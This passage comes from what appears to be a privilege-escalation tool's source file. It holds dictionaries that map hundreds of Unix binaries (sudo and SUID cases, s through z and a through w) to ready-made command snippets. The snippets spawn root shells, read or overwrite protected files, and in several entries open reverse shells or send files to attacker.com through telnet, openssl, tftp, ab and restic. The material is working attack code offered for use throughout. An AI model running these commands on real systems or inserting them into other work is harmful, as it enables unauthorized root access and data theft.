        "sudo smbclient '\\\\attacker\\share'\n!/bin/sh\n"
    ],
    "snap": [
        "sudo snap install xxxx_1.0_all.snap --dangerous --devmode\n"
    ],
    "socat": [
        "sudo socat stdin exec:/bin/sh\n"
    ],
    "soelim": [
        "LFILE=file_to_read\nsudo soelim \"$LFILE\"\n"
    ],
    "softlimit": [
        "sudo softlimit /bin/sh"
    ],
    "sort": [
        "LFILE=file_to_read\nsudo sort -m \"$LFILE\"\n"
    ],
    "split": [
        "sudo split --filter=/bin/sh /dev/stdin\n"
    ],
    "sqlite3": [
        "sudo sqlite3 /dev/null '.shell /bin/sh'"
    ],
    "sqlmap": [
        "sudo sqlmap -u 127.0.0.1 --eval=\"import os; os.system('/bin/sh')\""
    ],
    "ss": [
        "LFILE=file_to_read\nsudo ss -a -F $LFILE\n"
    ],
    "ssh": [
        "sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x"
    ],
    "ssh-agent": [
        "sudo ssh-agent /bin/"
    ],
    "ssh-keygen": [
        "sudo ssh-keygen -D ./lib.so"
    ],
    "ssh-keyscan": [
        "LFILE=file_to_read\nsudo ssh-keyscan -f $LFILE\n"
    ],
    "sshpass": [
        "sudo sshpass /bin/sh"
    ],
    "start-stop-daemon": [
        "sudo start-stop-daemon -n $RANDOM -S -x /bin/sh"
    ],
    "stdbuf": [
        "sudo stdbuf -i0 /bin/sh"
    ],
    "strace": [
        "sudo strace -o /dev/null /bin/sh"
    ],
    "strings": [
        "LFILE=file_to_read\nsudo strings \"$LFILE\"\n"
    ],
    "su": [
        "sudo su"
    ],
    "sysctl": [
        "COMMAND='/bin/sh -c id>/tmp/id'\nsudo sysctl \"kernel.core_pattern=|$COMMAND\"\nsleep 9999 &\nkill -QUIT $!\ncat /tmp/id\n"
    ],
    "systemctl": [
        "TF=$(mktemp)\necho /bin/sh >$TF\nchmod +x $TF\nsudo SYSTEMD_EDITOR=$TF systemctl edit system.slice\n",
        "TF=$(mktemp).service\necho '[Service]\nType=oneshot\nExecStart=/bin/sh -c \"id > /tmp/output\"\n[Install]\nWantedBy=multi-user.target' > $TF\nsudo systemctl link $TF\nsudo systemctl enable --now $TF\n",
        "sudo systemctl\n!sh\n"
    ],
    "systemd-resolve": [
        "sudo systemd-resolve --status\n!sh\n"
    ],
    "tac": [
        "LFILE=file_to_read\nsudo tac -s 'RANDOM' \"$LFILE\"\n"
    ],
    "tail": [
        "LFILE=file_to_read\nsudo tail -c1G \"$LFILE\"\n"
    ],
    "tar": [
        "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
    ],
    "task": [
        "sudo task execute /bin/sh"
    ],
    "taskset": [
        "sudo taskset 1 /bin/sh"
    ],
    "tasksh": [
        "sudo tasksh\n!/bin/sh\n"
    ],
    "tbl": [
        "LFILE=file_to_read\nsudo tbl $LFILE\n"
    ],
    "tclsh": [
        "sudo tclsh\nexec /bin/sh <@stdin >@stdout 2>@stderr\n"
    ],
    "tcpdump": [
        "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\nsudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root\n"
    ],
    "tdbtool": [
        "sudo tdbtool\n! /bin/sh\n"
    ],
    "tee": [
        "LFILE=file_to_write\necho DATA | sudo tee -a \"$LFILE\"\n"
    ],
    "telnet": [
        "RHOST=attacker.com\nRPORT=12345\nsudo telnet $RHOST $RPORT\n^]\n!/bin/sh\n"
    ],
    "terraform": [
        "sudo terraform console\nfile(\"file_to_read\")\n"
    ],
    "tex": [
        "sudo tex --shell-escape '\\write18{/bin/sh}\\end'\n"
    ],
    "tftp": [
        "RHOST=attacker.com\nsudo tftp $RHOST\nput file_to_send\n"
    ],
    "tic": [
        "LFILE=file_to_read\nsudo tic -C \"$LFILE\"\n"
    ],
    "time": [
        "sudo /usr/bin/time /bin/sh"
    ],
    "timedatectl": [
        "sudo timedatectl list-timezones\n!/bin/sh\n"
    ],
    "timeout": [
        "sudo timeout --foreground 7d /bin/sh"
    ],
    "tmate": [
        "sudo tmate -c /bin/sh"
    ],
    "tmux": [
        "sudo tmux"
    ],
    "top": [
        "echo -e 'pipe\\tx\\texec /bin/sh 1>&0 2>&0' >>/root/.config/procps/toprc\nsudo top\n# press return twice\nreset\n"
    ],
    "torify": [
        "sudo torify /bin/sh"
    ],
    "torsocks": [
        "sudo torsocks /bin/sh"
    ],
    "troff": [
        "LFILE=file_to_read\nsudo troff $LFILE\n"
    ],
    "ul": [
        "LFILE=file_to_read\nsudo ul \"$LFILE\"\n"
    ],
    "unexpand": [
        "LFILE=file_to_read\nsudo unexpand -t99999999 \"$LFILE\"\n"
    ],
    "uniq": [
        "LFILE=file_to_read\nsudo uniq \"$LFILE\"\n"
    ],
    "unshare": [
        "sudo unshare /bin/sh"
    ],
    "unsquashfs": [
        "sudo unsquashfs shell\n./squashfs-root/sh -p\n"
    ],
    "unzip": [
        "sudo unzip -K shell.zip\n./sh -p\n"
    ],
    "update-alternatives": [
        "LFILE=/path/to/file_to_write\nTF=$(mktemp)\necho DATA >$TF\nsudo update-alternatives --force --install \"$LFILE\" x \"$TF\" 0\n"
    ],
    "uudecode": [
        "LFILE=file_to_read\nsudo uuencode \"$LFILE\" /dev/stdout | uudecode\n"
    ],
    "uuencode": [
        "LFILE=file_to_read\nsudo uuencode \"$LFILE\" /dev/stdout | uudecode\n"
    ],
    "vagrant": [
        "cd $(mktemp -d)\necho 'exec \"/bin/sh\"' > Vagrantfile\nvagrant up\n"
    ],
    "valgrind": [
        "sudo valgrind /bin/sh"
    ],
    "vi": [
        "sudo vi -c ':!/bin/sh' /dev/null"
    ],
    "view": [
        "sudo view -c ':!/bin/sh'",
        "sudo view -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
        "sudo view -c ':lua os.execute(\"reset; exec sh\")'"
    ],
    "vigr": [
        "sudo vigr"
    ],
    "vim": [
        "sudo vim -c ':!/bin/sh'",
        "sudo vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
        "sudo vim -c ':lua os.execute(\"reset; exec sh\")'"
    ],
    "vimdiff": [
        "sudo vimdiff -c ':!/bin/sh'",
        "sudo vimdiff -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
        "sudo vimdiff -c ':lua os.execute(\"reset; exec sh\")'"
    ],
    "vipw": [
        "sudo vipw"
    ],
    "virsh": [
        "SCRIPT=script_to_run\nTF=$(mktemp)\ncat > $TF << EOF\n<domain type='kvm'>\n  <name>x</name>\n  <os>\n    <type arch='x86_64'>hvm</type>\n  </os>\n  <memory unit='KiB'>1</memory>\n  <devices>\n    <interface type='ethernet'>\n      <script path='$SCRIPT'/>\n    </interface>\n  </devices>\n</domain>\nEOF\nsudo virsh -c qemu:///system create $TF\nvirsh -c qemu:///system destroy x\n"
    ],
    "w3m": [
        "LFILE=file_to_read\nsudo w3m \"$LFILE\" -dump\n"
    ],
    "wall": [
        "LFILE=file_to_read\nsudo wall --nobanner \"$LFILE\"\n"
    ],
    "watch": [
        "sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'"
    ],
    "wc": [
        "LFILE=file_to_read\nsudo wc --files0-from \"$LFILE\"\n"
    ],
    "wget": [
        "TF=$(mktemp)\nchmod +x $TF\necho -e '#!/bin/sh\\n/bin/sh 1>&0' >$TF\nsudo wget --use-askpass=$TF 0\n"
    ],
    "whiptail": [
        "LFILE=file_to_read\nsudo whiptail --textbox --scrolltext \"$LFILE\" 0 0\n"
    ],
    "wireshark": [
        "PORT=4444\nsudo wireshark -c 1 -i lo -k -f \"udp port $PORT\" &\necho 'DATA' | nc -u 127.127.127.127 \"$PORT\"\n"
    ],
    "wish": [
        "sudo wish\nexec /bin/sh <@stdin >@stdout 2>@stderr\n"
    ],
    "xargs": [
        "sudo xargs -a /dev/null sh"
    ],
    "xdg-user-dir": [
        "sudo xdg-user-dir '}; /bin/sh #'\n"
    ],
    "xdotool": [
        "sudo xdotool exec --sync /bin/sh"
    ],
    "xelatex": [
        "sudo xelatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\nstrings article.dvi\n",
        "sudo xelatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n"
    ],
    "xetex": [
        "sudo xetex --shell-escape '\\write18{/bin/sh}\\end'\n"
    ],
    "xmodmap": [
        "LFILE=file_to_read\nsudo xmodmap -v $LFILE\n"
    ],
    "xmore": [
        "LFILE=file_to_read\nsudo xmore $LFILE\n"
    ],
    "xpad": [
        "LFILE=file_to_read\nsudo xpad -f \"$LFILE\"\n"
    ],
    "xxd": [
        "LFILE=file_to_read\nsudo xxd \"$LFILE\" | xxd -r\n"
    ],
    "xz": [
        "LFILE=file_to_read\nsudo xz -c \"$LFILE\" | xz -d\n"
    ],
    "yarn": [
        "sudo yarn exec /bin/sh"
    ],
    "yash": [
        "sudo yash"
    ],
    "yum": [
        "sudo yum localinstall -y x-1.0-1.noarch.rpm\n",
        "TF=$(mktemp -d)\ncat >$TF/x<<EOF\n[main]\nplugins=1\npluginpath=$TF\npluginconfpath=$TF\nEOF\n\ncat >$TF/y.conf<<EOF\n[main]\nenabled=1\nEOF\n\ncat >$TF/y.py<<EOF\nimport os\nimport yum\nfrom yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE\nrequires_api_version='2.1'\ndef init_hook(conduit):\n  os.execl('/bin/sh','/bin/sh')\nEOF\n\nsudo yum -c $TF/x --enableplugin=y\n"
    ],
    "zathura": [
        "sudo zathura\n:! /bin/sh -c 'exec /bin/sh 0<&1'\n"
    ],
    "zip": [
        "TF=$(mktemp -u)\nsudo zip $TF /etc/hosts -T -TT 'sh #'\nsudo rm $TF\n"
    ],
    "zsh": [
        "sudo zsh"
    ],
    "zsoelim": [
        "LFILE=file_to_read\nsudo zsoelim \"$LFILE\"\n"
    ],
    "zypper": [
        "sudo zypper x\n",
        "TF=$(mktemp -d)\ncp /bin/sh $TF/zypper-x\nsudo PATH=$TF:$PATH zypper x\n"
    ]
}
# SUDO_BINS_END

# SUID_BINS_START
suid_bins={
    "aa-exec": [
        "./aa-exec /bin/sh -p"
    ],
    "ab": [
        "URL=http://attacker.com/\nLFILE=file_to_send\n./ab -p $LFILE $URL\n"
    ],
    "agetty": [
        "./agetty -o -p -l /bin/sh -a root tty"
    ],
    "alpine": [
        "LFILE=file_to_read\n./alpine -F \"$LFILE\"\n"
    ],
    "ar": [
        "TF=$(mktemp -u)\nLFILE=file_to_read\n./ar r \"$TF\" \"$LFILE\"\ncat \"$TF\"\n"
    ],
    "arj": [
        "TF=$(mktemp -d)\nLFILE=file_to_write\nLDIR=where_to_write\necho DATA >\"$TF/$LFILE\"\narj a \"$TF/a\" \"$TF/$LFILE\"\n./arj e \"$TF/a\" $LDIR\n"
    ],
    "arp": [
        "LFILE=file_to_read\n./arp -v -f \"$LFILE\"\n"
    ],
    "as": [
        "LFILE=file_to_read\n./as @$LFILE\n"
    ],
    "ascii-xfr": [
        "LFILE=file_to_read\n./ascii-xfr -ns \"$LFILE\"\n"
    ],
    "ash": [
        "./ash"
    ],
    "aspell": [
        "LFILE=file_to_read\n./aspell -c \"$LFILE\"\n"
    ],
    "atobm": [
        "LFILE=file_to_read\n./atobm $LFILE 2>&1 | awk -F \"'\" '{printf \"%s\", $2}'\n"
    ],
    "awk": [
        "LFILE=file_to_read\n./awk '//' \"$LFILE\"\n"
    ],
    "base32": [
        "LFILE=file_to_read\nbase32 \"$LFILE\" | base32 --decode\n"
    ],
    "base64": [
        "LFILE=file_to_read\n./base64 \"$LFILE\" | base64 --decode\n"
    ],
    "basenc": [
        "LFILE=file_to_read\nbasenc --base64 $LFILE | basenc -d --base64\n"
    ],
    "basez": [
        "LFILE=file_to_read\n./basez \"$LFILE\" | basez --decode\n"
    ],
    "bash": [
        "./bash -p"
    ],
    "bc": [
        "LFILE=file_to_read\n./bc -s $LFILE\nquit\n"
    ],
    "bridge": [
        "LFILE=file_to_read\n./bridge -b \"$LFILE\"\n"
    ],
    "busybox": [
        "./busybox sh"
    ],
    "bzip2": [
        "LFILE=file_to_read\n./bzip2 -c $LFILE | bzip2 -d\n"
    ],
    "cabal": [
        "./cabal exec -- /bin/sh -p"
    ],
    "capsh": [
        "./capsh --gid=0 --uid=0 --"
    ],
    "cat": [
        "LFILE=file_to_read\n./cat \"$LFILE\"\n"
    ],
    "chmod": [
        "LFILE=file_to_change\n./chmod 6777 $LFILE\n"
    ],
    "choom": [
        "./choom -n 0 -- /bin/sh -p"
    ],
    "chown": [
        "LFILE=file_to_change\n./chown $(id -un):$(id -gn) $LFILE\n"
    ],
    "chroot": [
        "./chroot / /bin/sh -p\n"
    ],
    "clamscan": [
        "LFILE=file_to_read\nTF=$(mktemp -d)\ntouch $TF/empty.yara\n./clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\\1/p'\n"
    ],
    "cmp": [
        "LFILE=file_to_read\n./cmp $LFILE /dev/zero -b -l\n"
    ],
    "column": [
        "LFILE=file_to_read\n./column $LFILE\n"
    ],
    "comm": [
        "LFILE=file_to_read\ncomm $LFILE /dev/null 2>/dev/null\n"
    ],
    "cp": [
        "LFILE=file_to_write\necho \"DATA\" | ./cp /dev/stdin \"$LFILE\"\n",
        "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\n./cp $TF $LFILE\n",
        "LFILE=file_to_change\n./cp --attributes-only --preserve=all ./cp \"$LFILE\"\n"
    ],
    "cpio": [
        "LFILE=file_to_read\nTF=$(mktemp -d)\necho \"$LFILE\" | ./cpio -R $UID -dp $TF\ncat \"$TF/$LFILE\"\n",
        "LFILE=file_to_write\nLDIR=where_to_write\necho DATA >$LFILE\necho $LFILE | ./cpio -R 0:0 -p $LDIR\n"
    ],
    "cpulimit": [
        "./cpulimit -l 100 -f -- /bin/sh -p"
    ],
    "csh": [
        "./csh -b"
    ],
    "csplit": [
        "LFILE=file_to_read\ncsplit $LFILE 1\ncat xx01\n"
    ],
    "csvtool": [
        "LFILE=file_to_read\n./csvtool trim t $LFILE\n"
    ],
    "cupsfilter": [
        "LFILE=file_to_read\n./cupsfilter -i application/octet-stream -m application/octet-stream $LFILE\n"
    ],
    "curl": [
        "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\n./curl $URL -o $LFILE\n"
    ],
    "cut": [
        "LFILE=file_to_read\n./cut -d \"\" -f1 \"$LFILE\"\n"
    ],
    "dash": [
        "./dash -p"
    ],
    "date": [
        "LFILE=file_to_read\n./date -f $LFILE\n"
    ],
    "dd": [
        "LFILE=file_to_write\necho \"data\" | ./dd of=$LFILE\n"
    ],
    "debugfs": [
        "./debugfs\n!/bin/sh\n"
    ],
    "dialog": [
        "LFILE=file_to_read\n./dialog --textbox \"$LFILE\" 0 0\n"
    ],
    "diff": [
        "LFILE=file_to_read\n./diff --line-format=%L /dev/null $LFILE\n"
    ],
    "dig": [
        "LFILE=file_to_read\n./dig -f $LFILE\n"
    ],
    "distcc": [
        "./distcc /bin/sh -p"
    ],
    "dmsetup": [
        "./dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\n./dmsetup ls --exec '/bin/sh -p -s'\n"
    ],
    "docker": [
        "./docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
    ],
    "dosbox": [
        "LFILE='\\path\\to\\file_to_write'\n./dosbox -c 'mount c /' -c \"echo DATA >c:$LFILE\" -c exit\n"
    ],
    "ed": [
        "./ed file_to_read\n,p\nq\n"
    ],
    "efax": [
        "LFILE=file_to_read\n./efax -d \"$LFILE\"\n"
    ],
    "elvish": [
        "./elvish"
    ],
    "emacs": [
        "./emacs -Q -nw --eval '(term \"/bin/sh -p\")'"
    ],
    "env": [
        "./env /bin/sh -p"
    ],
    "eqn": [
        "LFILE=file_to_read\n./eqn \"$LFILE\"\n"
    ],
    "espeak": [
        "LFILE=file_to_read\n./espeak -qXf \"$LFILE\"\n"
    ],
    "expand": [
        "LFILE=file_to_read\n./expand \"$LFILE\"\n"
    ],
    "expect": [
        "./expect -c 'spawn /bin/sh -p;interact'"
    ],
    "file": [
        "LFILE=file_to_read\n./file -f $LFILE\n"
    ],
    "find": [
        "./find . -exec /bin/sh -p \\; -quit"
    ],
    "fish": [
        "./fish"
    ],
    "flock": [
        "./flock -u / /bin/sh -p"
    ],
    "fmt": [
        "LFILE=file_to_read\n./fmt -999 \"$LFILE\"\n"
    ],
    "fold": [
        "LFILE=file_to_read\n./fold -w99999999 \"$LFILE\"\n"
    ],
    "gawk": [
        "LFILE=file_to_read\n./gawk '//' \"$LFILE\"\n"
    ],
    "gcore": [
        "./gcore $PID"
    ],
    "gdb": [
        "./gdb -nx -ex 'python import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' -ex quit"
    ],
    "genie": [
        "./genie -c '/bin/sh'"
    ],
    "genisoimage": [
        "LFILE=file_to_read\n./genisoimage -sort \"$LFILE\"\n"
    ],
    "gimp": [
        "./gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
    ],
    "grep": [
        "LFILE=file_to_read\n./grep '' $LFILE\n"
    ],
    "gtester": [
        "TF=$(mktemp)\necho '#!/bin/sh -p' > $TF\necho 'exec /bin/sh -p 0<&1' >> $TF\nchmod +x $TF\nsudo gtester -q $TF\n"
    ],
    "gzip": [
        "LFILE=file_to_read\n./gzip -f $LFILE -t\n"
    ],
    "hd": [
        "LFILE=file_to_read\n./hd \"$LFILE\"\n"
    ],
    "head": [
        "LFILE=file_to_read\n./head -c1G \"$LFILE\"\n"
    ],
    "hexdump": [
        "LFILE=file_to_read\n./hexdump -C \"$LFILE\"\n"
    ],
    "highlight": [
        "LFILE=file_to_read\n./highlight --no-doc --failsafe \"$LFILE\"\n"
    ],
    "hping3": [
        "./hping3\n/bin/sh -p\n"
    ],
    "iconv": [
        "LFILE=file_to_read\n./iconv -f 8859_1 -t 8859_1 \"$LFILE\"\n"
    ],
    "install": [
        "LFILE=file_to_change\nTF=$(mktemp)\n./install -m 6777 $LFILE $TF\n"
    ],
    "ionice": [
        "./ionice /bin/sh -p"
    ],
    "ip": [
        "LFILE=file_to_read\n./ip -force -batch \"$LFILE\"\n",
        "./ip netns add foo\n./ip netns exec foo /bin/sh -p\n./ip netns delete foo\n"
    ],
    "ispell": [
        "./ispell /etc/passwd\n!/bin/sh -p\n"
    ],
    "jjs": [
        "echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()\" | ./jjs"
    ],
    "join": [
        "LFILE=file_to_read\n./join -a 2 /dev/null $LFILE\n"
    ],
    "jq": [
        "LFILE=file_to_read\n./jq -Rr . \"$LFILE\"\n"
    ],
    "jrunscript": [
        "./jrunscript -e \"exec('/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)')\""
    ],
    "julia": [
        "./julia -e 'run(`/bin/sh -p`)'\n"
    ],
    "ksh": [
        "./ksh -p"
    ],
    "ksshell": [
        "LFILE=file_to_read\n./ksshell -i $LFILE\n"
    ],
    "kubectl": [
        "LFILE=dir_to_serve\n./kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/\n"
    ],
    "ld.so": [
        "./ld.so /bin/sh -p"
    ],
    "less": [
        "./less file_to_read"
    ],
    "logsave": [
        "./logsave /dev/null /bin/sh -i -p"
    ],
    "look": [
        "LFILE=file_to_read\n./look '' \"$LFILE\"\n"
    ],
    "lua": [
        "lua -e 'local f=io.open(\"file_to_read\", \"rb\"); print(f:read(\"*a\")); io.close(f);'"
    ],
    "make": [
        "COMMAND='/bin/sh -p'\n./make -s --eval=$'x:\\n\\t-'\"$COMMAND\"\n"
    ],
    "mawk": [
        "LFILE=file_to_read\n./mawk '//' \"$LFILE\"\n"
    ],
    "minicom": [
        "./minicom -D /dev/null\n"
    ],
    "more": [
        "./more file_to_read"
    ],
    "mosquitto": [
        "LFILE=file_to_read\n./mosquitto -c \"$LFILE\"\n"
    ],
    "msgattrib": [
        "LFILE=file_to_read\n./msgattrib -P $LFILE\n"
    ],
    "msgcat": [
        "LFILE=file_to_read\n./msgcat -P $LFILE\n"
    ],
    "msgconv": [
        "LFILE=file_to_read\n./msgconv -P $LFILE\n"
    ],
    "msgfilter": [
        "echo x | ./msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'\n"
    ],
    "msgmerge": [
        "LFILE=file_to_read\n./msgmerge -P $LFILE /dev/null\n"
    ],
    "msguniq": [
        "LFILE=file_to_read\n./msguniq -P $LFILE\n"
    ],
    "multitime": [
        "./multitime /bin/sh -p"
    ],
    "mv": [
        "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\n./mv $TF $LFILE\n"
    ],
    "nasm": [
        "LFILE=file_to_read\n./nasm -@ $LFILE\n"
    ],
    "nawk": [
        "LFILE=file_to_read\n./nawk '//' \"$LFILE\"\n"
    ],
    "ncftp": [
        "./ncftp\n!/bin/sh -p\n"
    ],
    "nft": [
        "LFILE=file_to_read\n./nft -f \"$LFILE\"\n"
    ],
    "nice": [
        "./nice /bin/sh -p"
    ],
    "nl": [
        "LFILE=file_to_read\n./nl -bn -w1 -s '' $LFILE\n"
    ],
    "nm": [
        "LFILE=file_to_read\n./nm @$LFILE\n"
    ],
    "nmap": [
        "LFILE=file_to_write\n./nmap -oG=$LFILE DATA\n"
    ],
    "node": [
        "./node -e 'require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"], {stdio: [0, 1, 2]})'\n"
    ],
    "nohup": [
        "./nohup /bin/sh -p -c \"sh -p <$(tty) >$(tty) 2>$(tty)\""
    ],
    "od": [
        "LFILE=file_to_read\n./od -An -c -w9999 \"$LFILE\"\n"
    ],
    "openssl": [
        "RHOST=attacker.com\nRPORT=12345\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | ./openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s\n",
        "LFILE=file_to_write\necho DATA | openssl enc -out \"$LFILE\"\n"
    ],
    "openvpn": [
        "./openvpn --dev null --script-security 2 --up '/bin/sh -p -c \"sh -p\"'\n",
        "LFILE=file_to_read\n./openvpn --config \"$LFILE\"\n"
    ],
    "pandoc": [
        "LFILE=file_to_write\necho DATA | ./pandoc -t plain -o \"$LFILE\"\n"
    ],
    "paste": [
        "LFILE=file_to_read\npaste $LFILE\n"
    ],
    "perf": [
        "./perf stat /bin/sh -p\n"
    ],
    "perl": [
        "./perl -e 'exec \"/bin/sh\";'"
    ],
    "pexec": [
        "./pexec /bin/sh -p"
    ],
    "pg": [
        "./pg file_to_read"
    ],
    "php": [
        "CMD=\"/bin/sh\"\n./php -r \"pcntl_exec('/bin/sh', ['-p']);\"\n"
    ],
    "pidstat": [
        "COMMAND=id\n./pidstat -e $COMMAND\n"
    ],
    "pr": [
        "LFILE=file_to_read\npr -T $LFILE\n"
    ],
    "ptx": [
        "LFILE=file_to_read\n./ptx -w 5000 \"$LFILE\"\n"
    ],
    "python": [
        "./python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
    ],
    "rc": [
        "./rc -c '/bin/sh -p'"
    ],
    "readelf": [
        "LFILE=file_to_read\n./readelf -a @$LFILE\n"
    ],
    "restic": [
        "RHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\n./restic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\"\n"
    ],
    "rev": [
        "LFILE=file_to_read\n./rev $LFILE | rev\n"
    ],
    "rlwrap": [
        "./rlwrap -H /dev/null /bin/sh -p"
    ],
    "rsync": [
        "./rsync -e 'sh -p -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"
    ],
    "rtorrent": [
        "echo \"execute = /bin/sh,-p,-c,\\\"/bin/sh -p <$(tty) >$(tty) 2>$(tty)\\\"\" >~/.rtorrent.rc\n./rtorrent\n"
    ],
    "run-parts": [
        "./run-parts --new-session --regex '^sh$' /bin --arg='-p'"
    ],
    "rview": [
        "./rview -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"
    ],
    "rvim": [
        "./rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"
    ],
    "sash": [
        "./sash"
    ],
    "scanmem": [
        "./scanmem\nshell /bin/sh\n"
    ],
    "sed": [
        "LFILE=file_to_read\n./sed -e '' \"$LFILE\"\n"
    ],
    "setarch": [
        "./setarch $(arch) /bin/sh -p"
    ],
    "setfacl": [
        "LFILE=file_to_change\nUSER=somebody\n./setfacl -m u:$USER:rwx $LFILE\n"
    ],
    "setlock": [
        "./setlock - /bin/sh -p"
    ],
    "shuf": [
        "LFILE=file_to_write\n./shuf -e DATA -o \"$LFILE\"\n"
    ],
    "soelim": [
        "LFILE=file_to_read\n./soelim \"$LFILE\"\n"
    ],
    "softlimit": [
        "./softlimit /bin/sh -p"
    ],
    "sort": [
        "LFILE=file_to_read\n./sort -m \"$LFILE\"\n"
    ],
    "sqlite3": [
        "LFILE=file_to_read\nsqlite3 << EOF\nCREATE TABLE t(line TEXT);\n.import $LFILE t\nSELECT * FROM t;\nEOF\n"
    ],
    "ss": [
        "LFILE=file_to_read\n./ss -a -F $LFILE\n"
    ],
    "ssh-agent": [
        "./ssh-agent /bin/ -p"
    ],
    "ssh-keygen": [
        "./ssh-keygen -D ./lib.so"
    ],
    "ssh-keyscan": [
        "LFILE=file_to_read\n./ssh-keyscan -f $LFILE\n"
    ],
    "sshpass": [
        "./sshpass /bin/sh -p"
    ],
    "start-stop-daemon": [
        "./start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p"
    ],
    "stdbuf": [
        "./stdbuf -i0 /bin/sh -p"
    ],
    "strace": [
        "./strace -o /dev/null /bin/sh -p"
    ],
    "strings": [
        "LFILE=file_to_read\n./strings \"$LFILE\"\n"
    ],
    "sysctl": [
        "COMMAND='/bin/sh -c id>/tmp/id'\n./sysctl \"kernel.core_pattern=|$COMMAND\"\nsleep 9999 &\nkill -QUIT $!\ncat /tmp/id\n"
    ],
    "systemctl": [
        "TF=$(mktemp).service\necho '[Service]\nType=oneshot\nExecStart=/bin/sh -c \"id > /tmp/output\"\n[Install]\nWantedBy=multi-user.target' > $TF\n./systemctl link $TF\n./systemctl enable --now $TF\n"
    ],
    "tac": [
        "LFILE=file_to_read\n./tac -s 'RANDOM' \"$LFILE\"\n"
    ],
    "tail": [
        "LFILE=file_to_read\n./tail -c1G \"$LFILE\"\n"
    ],
    "taskset": [
        "./taskset 1 /bin/sh -p"
    ],
    "tbl": [
        "LFILE=file_to_read\n./tbl $LFILE\n"
    ],
    "tclsh": [
        "./tclsh\nexec /bin/sh -p <@stdin >@stdout 2>@stderr\n"
    ],
    "tee": [
        "LFILE=file_to_write\necho DATA | ./tee -a \"$LFILE\"\n"
    ],
    "terraform": [
        "./terraform console\nfile(\"file_to_read\")\n"
    ],
    "tftp": [
        "RHOST=attacker.com\n./tftp $RHOST\nput file_to_send\n"
    ],
    "tic": [
        "LFILE=file_to_read\n./tic -C \"$LFILE\"\n"
    ],
    "time": [
        "./time /bin/sh -p"
    ],
    "timeout": [
        "./timeout 7d /bin/sh -p"
    ],
    "troff": [
        "LFILE=file_to_read\n./troff $LFILE\n"
    ],
    "ul": [
        "LFILE=file_to_read\n./ul \"$LFILE\"\n"
    ],
    "unexpand": [
        "LFILE=file_to_read\n./unexpand -t99999999 \"$LFILE\"\n"
    ],
    "uniq": [
        "LFILE=file_to_read\n./uniq \"$LFILE\"\n"
    ],
    "unshare": [
        "./unshare -r /bin/sh"
    ],
    "unsquashfs": [
        "./unsquashfs shell\n./squashfs-root/sh -p\n"
    ],
    "unzip": [
        "./unzip -K shell.zip\n./sh -p\n"
    ],
    "update-alternatives": [
        "LFILE=/path/to/file_to_write\nTF=$(mktemp)\necho DATA >$TF\n./update-alternatives --force --install \"$LFILE\" x \"$TF\" 0\n"
    ],
    "uudecode": [
        "LFILE=file_to_read\nuuencode \"$LFILE\" /dev/stdout | uudecode\n"
    ],
    "uuencode": [
        "LFILE=file_to_read\nuuencode \"$LFILE\" /dev/stdout | uudecode\n"
    ],
    "vagrant": [
        "cd $(mktemp -d)\necho 'exec \"/bin/sh -p\"' > Vagrantfile\nvagrant up\n"
    ],
    "view": [
        "./view -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"
    ],
    "vigr": [
        "./vigr"
    ],
    "vim": [
        "./vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"
    ],
    "vimdiff": [
        "./vimdiff -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"
    ],
    "vipw": [
        "./vipw"
    ],
    "w3m": [
        "LFILE=file_to_read\n./w3m \"$LFILE\" -dump\n"
    ],
    "watch": [
        "./watch -x sh -p -c 'reset; exec sh -p 1>&0 2>&0'"
    ],
    "wc": [
        "LFILE=file_to_read\n./wc --files0-from \"$LFILE\"\n"
    ],
    "wget": [
        "TF=$(mktemp)\nchmod +x $TF\necho -e '#!/bin/sh -p\\n/bin/sh -p 1>&0' >$TF\n./wget --use-askpass=$TF 0\n"
    ],
    "whiptail": [
